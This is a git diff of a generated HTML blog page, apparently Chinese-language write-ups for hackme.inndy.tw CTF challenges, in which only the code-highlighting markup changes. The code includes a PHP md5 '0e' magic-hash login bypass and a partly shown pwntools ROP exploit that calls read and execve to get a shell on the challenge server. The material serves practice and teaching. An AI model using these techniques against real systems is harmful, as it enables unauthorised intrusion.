+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>(听 M4x 师傅说这道题 Inndy 师傅本意是让我们直接修改 xz 文件去掉开头的一堆重复&hellip;)</p>
 <p><del>后来我试着研究了一下, 放弃了</del></p>
@@ -602,19 +602,19 @@ Tips: LFI, php://filter</p>
 </span><span class="lnt">12
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kd">function</span> <span class="nx">print_qrcode</span><span class="p">(</span><span class="nx">o</span><span class="p">,</span> <span class="nx">c</span><span class="p">,</span> <span class="nx">n</span><span class="p">,</span> <span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
-  <span class="kd">var</span> <span class="nx">r</span> <span class="o">=</span> <span class="p">[],</span>
-    <span class="nx">l</span> <span class="o">=</span> <span class="p">[];</span>
-  <span class="nx">c</span> <span class="o">=</span> <span class="nx">c</span> <span class="o">||</span> <span class="s2">&#34;22px&#34;</span><span class="p">,</span> <span class="nx">n</span> <span class="o">=</span> <span class="nx">n</span> <span class="o">||</span> <span class="s2">&#34;black&#34;</span><span class="p">,</span> <span class="nx">e</span> <span class="o">=</span> <span class="nx">e</span> <span class="o">||</span> <span class="s2">&#34;white&#34;</span><span class="p">;</span>
-  <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">o</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
-    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">p</span> <span class="o">=</span> <span class="nx">o</span><span class="p">[</span><span class="nx">i</span><span class="p">],</span> <span class="nx">t</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">t</span> <span class="o">&lt;</span> <span class="nx">p</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">t</span><span class="o">++</span><span class="p">)</span> <span class="nx">l</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="s2">&#34;%c\u25a0&#34;</span><span class="p">),</span> <span class="nx">r</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="s2">&#34;line-height:0; font-size: &#34;</span> <span class="o">+</span> <span class="nx">c</span> <span class="o">+</span> <span class="s2">&#34;; color:&#34;</span> <span class="o">+</span> <span class="p">(</span><span class="s2">&#34;1&#34;</span> <span class="o">==</span> <span class="nx">p</span><span class="p">[</span><span class="nx">t</span><span class="p">]</span> <span class="o">?</span> <span class="nx">n</span> <span class="o">:</span> <span class="nx">e</span><span class="p">));</span>
-    <span class="nx">l</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="s2">&#34;\n&#34;</span><span class="p">)</span>
-  <span class="p">}</span>
-  <span class="nx">r</span><span class="p">.</span><span class="nx">unshift</span><span class="p">(</span><span class="nx">l</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">)),</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="nx">console</span><span class="p">,</span> <span class="nx">r</span><span class="p">)</span>
-<span class="p">}</span>
-<span class="kd">var</span> <span class="nx">qrcode</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;11111110001000110011101111111&#34;</span><span class="p">,</span> <span class="s2">&#34;10000010111000110100101000001&#34;</span><span class="p">,</span> <span class="s2">&#34;10111010100000100100001011101&#34;</span><span class="p">,</span> <span class="s2">&#34;10111010010010010001001011101&#34;</span><span class="p">,</span> <span class="s2">&#34;10111010111010111010101011101&#34;</span><span class="p">,</span> <span class="s2">&#34;10000010101010011001001000001&#34;</span><span class="p">,</span> <span class="s2">&#34;11111110101010101010101111111&#34;</span><span class="p">,</span> <span class="s2">&#34;000000001011000101101&#34;</span><span class="p">,</span> <span class="s2">&#34;1101001100011110101000111011&#34;</span><span class="p">,</span> <span class="s2">&#34;1111000111011010110011110001&#34;</span><span class="p">,</span> <span class="s2">&#34;1101111000011100101100011001&#34;</span><span class="p">,</span> <span class="s2">&#34;110111011111110110110101001&#34;</span><span class="p">,</span> <span class="s2">&#34;01011011001100101111111101001&#34;</span><span class="p">,</span> <span class="s2">&#34;00100101010101000101110000111&#34;</span><span class="p">,</span> <span class="s2">&#34;00011011000101100110011001111&#34;</span><span class="p">,</span> <span class="s2">&#34;1010110101010001111101101001&#34;</span><span class="p">,</span> <span class="s2">&#34;00001011110011000111110001111&#34;</span><span class="p">,</span> <span class="s2">&#34;0101100100001110100011110001&#34;</span><span class="p">,</span> <span class="s2">&#34;10010111100110100010110111011&#34;</span><span class="p">,</span> <span class="s2">&#34;0010110110101011011010011101&#34;</span><span class="p">,</span> <span class="s2">&#34;10010110010000001010111110111&#34;</span><span class="p">,</span> <span class="s2">&#34;0000000011110010110110001111&#34;</span><span class="p">,</span> <span class="s2">&#34;1111111010100000101010101111&#34;</span><span class="p">,</span> <span class="s2">&#34;10000010000000111000100011101&#34;</span><span class="p">,</span> <span class="s2">&#34;10111010001010001000111110011&#34;</span><span class="p">,</span> <span class="s2">&#34;1011101010111000001010100111&#34;</span><span class="p">,</span> <span class="s2">&#34;10111010001010000111110010001&#34;</span><span class="p">,</span> <span class="s2">&#34;1000001011101111111110010101&#34;</span><span class="p">,</span> <span class="s2">&#34;1111111011010110010011001101&#34;</span><span class="p">];</span>
-<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;%cI love CTF!&#34;</span><span class="p">,</span> <span class="s2">&#34;color: pink; font-size: 64px&#34;</span><span class="p">),</span> <span class="nx">print_qrcode</span><span class="p">(</span><span class="nx">qrcode</span><span class="p">,</span> <span class="s2">&#34;25px&#34;</span><span class="p">,</span> <span class="s2">&#34;#333&#34;</span><span class="p">,</span> <span class="s2">&#34;#ccc&#34;</span><span class="p">);</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">print_qrcode</span><span class="p">(</span><span class="nx">o</span><span class="p">,</span> <span class="nx">c</span><span class="p">,</span> <span class="nx">n</span><span class="p">,</span> <span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">r</span> <span class="o">=</span> <span class="p">[],</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">l</span> <span class="o">=</span> <span class="p">[];</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">c</span> <span class="o">=</span> <span class="nx">c</span> <span class="o">||</span> <span class="s2">&#34;22px&#34;</span><span class="p">,</span> <span class="nx">n</span> <span class="o">=</span> <span class="nx">n</span> <span class="o">||</span> <span class="s2">&#34;black&#34;</span><span class="p">,</span> <span class="nx">e</span> <span class="o">=</span> <span class="nx">e</span> <span class="o">||</span> <span class="s2">&#34;white&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">o</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">p</span> <span class="o">=</span> <span class="nx">o</span><span class="p">[</span><span class="nx">i</span><span class="p">],</span> <span class="nx">t</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">t</span> <span class="o">&lt;</span> <span class="nx">p</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">t</span><span class="o">++</span><span class="p">)</span> <span class="nx">l</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="s2">&#34;%c\u25a0&#34;</span><span class="p">),</span> <span class="nx">r</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="s2">&#34;line-height:0; font-size: &#34;</span> <span class="o">+</span> <span class="nx">c</span> <span class="o">+</span> <span class="s2">&#34;; color:&#34;</span> <span class="o">+</span> <span class="p">(</span><span class="s2">&#34;1&#34;</span> <span class="o">==</span> <span class="nx">p</span><span class="p">[</span><span class="nx">t</span><span class="p">]</span> <span class="o">?</span> <span class="nx">n</span> <span class="o">:</span> <span class="nx">e</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">l</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="s2">&#34;\n&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">r</span><span class="p">.</span><span class="nx">unshift</span><span class="p">(</span><span class="nx">l</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">)),</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="nx">console</span><span class="p">,</span> <span class="nx">r</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">qrcode</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;11111110001000110011101111111&#34;</span><span class="p">,</span> <span class="s2">&#34;10000010111000110100101000001&#34;</span><span class="p">,</span> <span class="s2">&#34;10111010100000100100001011101&#34;</span><span class="p">,</span> <span class="s2">&#34;10111010010010010001001011101&#34;</span><span class="p">,</span> <span class="s2">&#34;10111010111010111010101011101&#34;</span><span class="p">,</span> <span class="s2">&#34;10000010101010011001001000001&#34;</span><span class="p">,</span> <span class="s2">&#34;11111110101010101010101111111&#34;</span><span class="p">,</span> <span class="s2">&#34;000000001011000101101&#34;</span><span class="p">,</span> <span class="s2">&#34;1101001100011110101000111011&#34;</span><span class="p">,</span> <span class="s2">&#34;1111000111011010110011110001&#34;</span><span class="p">,</span> <span class="s2">&#34;1101111000011100101100011001&#34;</span><span class="p">,</span> <span class="s2">&#34;110111011111110110110101001&#34;</span><span class="p">,</span> <span class="s2">&#34;01011011001100101111111101001&#34;</span><span class="p">,</span> <span class="s2">&#34;00100101010101000101110000111&#34;</span><span class="p">,</span> <span class="s2">&#34;00011011000101100110011001111&#34;</span><span class="p">,</span> <span class="s2">&#34;1010110101010001111101101001&#34;</span><span class="p">,</span> <span class="s2">&#34;00001011110011000111110001111&#34;</span><span class="p">,</span> <span class="s2">&#34;0101100100001110100011110001&#34;</span><span class="p">,</span> <span class="s2">&#34;10010111100110100010110111011&#34;</span><span class="p">,</span> <span class="s2">&#34;0010110110101011011010011101&#34;</span><span class="p">,</span> <span class="s2">&#34;10010110010000001010111110111&#34;</span><span class="p">,</span> <span class="s2">&#34;0000000011110010110110001111&#34;</span><span class="p">,</span> <span class="s2">&#34;1111111010100000101010101111&#34;</span><span class="p">,</span> <span class="s2">&#34;10000010000000111000100011101&#34;</span><span class="p">,</span> <span class="s2">&#34;10111010001010001000111110011&#34;</span><span class="p">,</span> <span class="s2">&#34;1011101010111000001010100111&#34;</span><span class="p">,</span> <span class="s2">&#34;10111010001010000111110010001&#34;</span><span class="p">,</span> <span class="s2">&#34;1000001011101111111110010101&#34;</span><span class="p">,</span> <span class="s2">&#34;1111111011010110010011001101&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;%cI love CTF!&#34;</span><span class="p">,</span> <span class="s2">&#34;color: pink; font-size: 64px&#34;</span><span class="p">),</span> <span class="nx">print_qrcode</span><span class="p">(</span><span class="nx">qrcode</span><span class="p">,</span> <span class="s2">&#34;25px&#34;</span><span class="p">,</span> <span class="s2">&#34;#333&#34;</span><span class="p">,</span> <span class="s2">&#34;#ccc&#34;</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>可以看到里面有 qrcode 字样, 将这串01数组转成图片就能得到二维码(有个比较短的需要自己补齐),
 扫描得到flag</p>
@@ -651,8 +651,8 @@ Tips: LFI, php://filter</p>
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">md5</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">])</span> <span class="o">==</span> <span class="s1">&#39;00000000000000000000000000000000&#39;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">md5</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">])</span> <span class="o">==</span> <span class="s1">&#39;00000000000000000000000000000000&#39;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>php 的神奇类型转换, <code>'0e123456' == '0'</code>, 只要找一个以 0e 开头并且后面全是纯数字的 md5 就行了.</p>
 <p>搜一下能搜到很多.</p>
@@ -682,13 +682,13 @@ Tips: LFI, php://filter</p>
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python</span>
-
-<span class="n">s</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;UIJT.JT.ZPVS.GMBH&#39;</span>
-
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
-    <span class="nb">print</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">),</span> <span class="n">end</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;UIJT.JT.ZPVS.GMBH&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">),</span> <span class="n">end</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="pyyy">pyyy</h2>
 <blockquote>
@@ -702,9 +702,9 @@ Tips: LFI, php://filter</p>
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="p">(</span><span class="k">lambda</span> <span class="n">_</span><span class="p">,</span> <span class="n">arg1</span><span class="p">,</span> <span class="n">arg2</span><span class="p">:</span> <span class="n">_</span><span class="p">(</span><span class="n">_</span><span class="p">,</span> <span class="n">arg1</span><span class="p">,</span> <span class="n">arg2</span><span class="p">))(</span>
-    <span class="k">lambda</span> <span class="bp">self</span><span class="p">,</span> <span class="n">arg1</span><span class="p">,</span> <span class="n">arg2</span><span class="p">:</span> <span class="s1">&#39;I can call my self&#39;</span><span class="p">,</span> <span class="n">arg1</span><span class="p">,</span> <span class="n">arg2</span><span class="p">)</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">(</span><span class="k">lambda</span> <span class="n">_</span><span class="p">,</span> <span class="n">arg1</span><span class="p">,</span> <span class="n">arg2</span><span class="p">:</span> <span class="n">_</span><span class="p">(</span><span class="n">_</span><span class="p">,</span> <span class="n">arg1</span><span class="p">,</span> <span class="n">arg2</span><span class="p">))(</span>
+</span></span><span class="line"><span class="cl">    <span class="k">lambda</span> <span class="bp">self</span><span class="p">,</span> <span class="n">arg1</span><span class="p">,</span> <span class="n">arg2</span><span class="p">:</span> <span class="s1">&#39;I can call my self&#39;</span><span class="p">,</span> <span class="n">arg1</span><span class="p">,</span> <span class="n">arg2</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>不过不知道也无所谓, 反正得到 flag 只要 <code>int(c) == l</code> 成立. c 是用户输入, l 是程序计算得到的值, 而且与 c 无关.</p>
 <p>那直接加个 print 输出 l 就行.</p>
@@ -771,20 +771,20 @@ Tips: LFI, php://filter</p>
 </span><span class="lnt">13
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">a1</span><span class="p">,</span> <span class="n">a2</span> <span class="o">=</span> <span class="n">BitVecs</span><span class="p">(</span><span class="s1">&#39;a1, a2&#39;</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
-<span class="n">solver</span> <span class="o">=</span> <span class="n">Solver</span><span class="p">()</span>
-<span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">a1</span> <span class="o">*</span> <span class="n">a2</span> <span class="o">==</span> <span class="o">-</span><span class="mi">574406350</span><span class="p">)</span>
-<span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">((</span><span class="n">a1</span> <span class="o">^</span> <span class="mh">0x7E</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">a2</span> <span class="o">+</span> <span class="mi">16</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1931514558</span><span class="p">)</span>
-<span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">((</span><span class="n">SignExt</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="n">a1</span><span class="p">)</span> <span class="o">-</span> <span class="n">SignExt</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="n">a2</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0xFFF</span> <span class="o">==</span> <span class="mi">3295</span><span class="p">)</span>
-
-<span class="k">while</span> <span class="n">solver</span><span class="o">.</span><span class="n">check</span><span class="p">()</span> <span class="o">==</span> <span class="n">sat</span><span class="p">:</span>
-    <span class="n">m</span> <span class="o">=</span> <span class="n">solver</span><span class="o">.</span><span class="n">model</span><span class="p">()</span>
-    <span class="n">x</span> <span class="o">=</span> <span class="n">m</span><span class="p">[</span><span class="n">a1</span><span class="p">]</span><span class="o">.</span><span class="n">as_long</span><span class="p">()</span>
-    <span class="n">y</span> <span class="o">=</span> <span class="n">m</span><span class="p">[</span><span class="n">a2</span><span class="p">]</span><span class="o">.</span><span class="n">as_long</span><span class="p">()</span>
-    <span class="k">if</span> <span class="n">is_prime</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
-        <span class="nb">print</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>
-    <span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">Or</span><span class="p">(</span><span class="n">a1</span> <span class="o">!=</span> <span class="n">x</span><span class="p">,</span> <span class="n">a2</span> <span class="o">!=</span> <span class="n">y</span><span class="p">))</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">a1</span><span class="p">,</span> <span class="n">a2</span> <span class="o">=</span> <span class="n">BitVecs</span><span class="p">(</span><span class="s1">&#39;a1, a2&#39;</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">solver</span> <span class="o">=</span> <span class="n">Solver</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">a1</span> <span class="o">*</span> <span class="n">a2</span> <span class="o">==</span> <span class="o">-</span><span class="mi">574406350</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">((</span><span class="n">a1</span> <span class="o">^</span> <span class="mh">0x7E</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">a2</span> <span class="o">+</span> <span class="mi">16</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1931514558</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">((</span><span class="n">SignExt</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="n">a1</span><span class="p">)</span> <span class="o">-</span> <span class="n">SignExt</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="n">a2</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0xFFF</span> <span class="o">==</span> <span class="mi">3295</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="n">solver</span><span class="o">.</span><span class="n">check</span><span class="p">()</span> <span class="o">==</span> <span class="n">sat</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">m</span> <span class="o">=</span> <span class="n">solver</span><span class="o">.</span><span class="n">model</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">x</span> <span class="o">=</span> <span class="n">m</span><span class="p">[</span><span class="n">a1</span><span class="p">]</span><span class="o">.</span><span class="n">as_long</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">y</span> <span class="o">=</span> <span class="n">m</span><span class="p">[</span><span class="n">a2</span><span class="p">]</span><span class="o">.</span><span class="n">as_long</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">is_prime</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">solver</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">Or</span><span class="p">(</span><span class="n">a1</span> <span class="o">!=</span> <span class="n">x</span><span class="p">,</span> <span class="n">a2</span> <span class="o">!=</span> <span class="n">y</span><span class="p">))</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>不难看出 what is fibonacci, 第一反应是使用 gmpy2.fib 进行计算. 算了半天发现不对劲, 才想起这个地方会溢出.</p>
 <p>于是使用 numpy.int32 手动运算, 辅以 <code>lru_cache</code>, 然而 maxsize 太小速度过慢,
@@ -831,8 +831,8 @@ ROP輕鬆談 by L4ys</p>
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">nc hackme.inndy.tw 7703
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nc hackme.inndy.tw 7703
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><code>ROPgadget</code>  not working anymore</p>
 </blockquote>
@@ -846,13 +846,13 @@ ROP輕鬆談 by L4ys</p>
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">[*] &#39;/tmp/tmp/rop2&#39;
-    Arch:     i386-32-little
-    RELRO:    Partial RELRO
-    Stack:    No canary found
-    NX:       NX enabled
-    PIE:      No PIE (0x8048000)
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[*] &#39;/tmp/tmp/rop2&#39;
+</span></span><span class="line"><span class="cl">    Arch:     i386-32-little
+</span></span><span class="line"><span class="cl">    RELRO:    Partial RELRO
+</span></span><span class="line"><span class="cl">    Stack:    No canary found
+</span></span><span class="line"><span class="cl">    NX:       NX enabled
+</span></span><span class="line"><span class="cl">    PIE:      No PIE (0x8048000)
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>开了栈不可执行. 不过可以调用 SYS_read, 往 some_buffer (.bss段的某个全局变量) 写入 /bin/sh, 然后调用 SYS_exexce get shell</p>
 <div class="highlight"><div class="chroma">
@@ -885,33 +885,33 @@ ROP輕鬆談 by L4ys</p>
 </span><span class="lnt">26
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="kn">from</span> <span class="nn">pwnlib.constants</span> <span class="kn">import</span> <span class="o">*</span>
-
-<span class="n">pwnlib</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;konsole&#39;</span><span class="p">,</span> <span class="s1">&#39;-e&#39;</span><span class="p">]</span>
-<span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;DEBUG&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">)</span>
-
-<span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;hackme.inndy.tw&#39;</span><span class="p">,</span> <span class="mi">7703</span><span class="p">)</span>
-<span class="c1"># io = process(&#39;./rop2&#39;)</span>
-<span class="n">ex</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./rop2&#39;</span><span class="p">)</span>
-<span class="c1"># pwnlib.gdb.attach(io)</span>
-<span class="c1"># raw_input()</span>
-
-<span class="n">buf_addr</span> <span class="o">=</span> <span class="n">ex</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;some_buffer&#39;</span><span class="p">]</span>
-<span class="n">syscall_addr</span> <span class="o">=</span> <span class="n">ex</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;syscall&#39;</span><span class="p">]</span>
-<span class="n">overflow_addr</span> <span class="o">=</span> <span class="n">ex</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;overflow&#39;</span><span class="p">]</span>
-
-<span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span><span class="s1">&#39;</span><span class="se">\x90</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0xC</span> <span class="o">+</span> <span class="mh">0x4</span><span class="p">),</span> <span class="n">syscall_addr</span><span class="p">,</span> <span class="n">overflow_addr</span><span class="p">,</span>
-                <span class="n">SYS_read</span><span class="p">,</span> <span class="n">constants</span><span class="o">.</span><span class="n">STDIN_FILENO</span><span class="p">,</span> <span class="n">buf_addr</span><span class="p">,</span> <span class="mi">7</span><span class="p">])</span>
-<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
-<span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span>
-
-<span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span><span class="s1">&#39;</span><span class="se">\x90</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0xC</span> <span class="o">+</span> <span class="mh">0x4</span><span class="p">),</span> <span class="n">syscall_addr</span><span class="p">,</span> <span class="mh">0xdeadbeef</span><span class="p">,</span>
-                <span class="n">SYS_execve</span><span class="p">,</span> <span class="n">buf_addr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">])</span>
-<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
-<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-<span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwnlib.constants</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">pwnlib</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;konsole&#39;</span><span class="p">,</span> <span class="s1">&#39;-e&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;DEBUG&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
